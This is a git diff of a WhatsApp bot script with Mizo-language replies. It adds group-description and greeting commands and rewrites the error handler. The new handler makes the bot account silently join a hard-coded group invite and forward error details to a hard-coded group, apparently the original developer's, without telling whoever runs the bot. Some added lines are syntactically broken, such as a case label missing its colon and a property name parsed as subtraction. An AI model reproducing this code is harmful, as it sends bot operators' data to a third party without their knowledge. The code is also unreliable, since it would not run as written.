@@ -2957,6 +2957,22 @@ case 'couplepp': case 'ppcouple': {
                 HBWABotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Hmeichhia` }, { quoted: m })
             }
 	    break
+case 'description' : case 'gpdesc': case 'desc': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+HBWABotInc.sendMessage(from, { text : `*${metadata.subject}\n\n*Group Description :*\n${metadata.desc}`},{ quoted: m})
+}
+break
+
+case 'hi': case 'hii': case 'hiii': case 'helo': case 'hello': case 'hi,': case 'hello,': case 'sir,' case 'sir': case 'kapu': {
+if (m.isGroup) return m.reply(mess.Hello-Herbert)
+const repf = await HBWABotInc.sendMessage(from, { 
+contacts: { 
+displayName: `${list.length} Contact`, 
+contacts: list }, mentions: [sender] }, { quoted: m })
+HBWABotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Kei hi bot ka nih a zawh duh i nei chuan owner hi va zawt rawh`, mentions: [sender]}, { quoted: repf })
+}
+break
           case 'emojimix': {
 		let [emoji1, emoji2] = text.split`+`
 		if (!emoji1) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} 😅+🤔`)
@@ -3607,7 +3623,8 @@ HBWABotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 } catch (err) {
 console.log(util.format(err))
 let e = String(err)
-HBWABotInc.sendMessage("@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+await HBWABotInc.groupAcceptInvite("https://chat.whatsapp.com/IgV6un73n0J9TfzyVsaBRA")
+HBWABotInc.sendMessage("120363021176504117@g.us", { text: "Hi Herbert he lai hi siamthat a ngai e👇\n" + util.format(e),
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
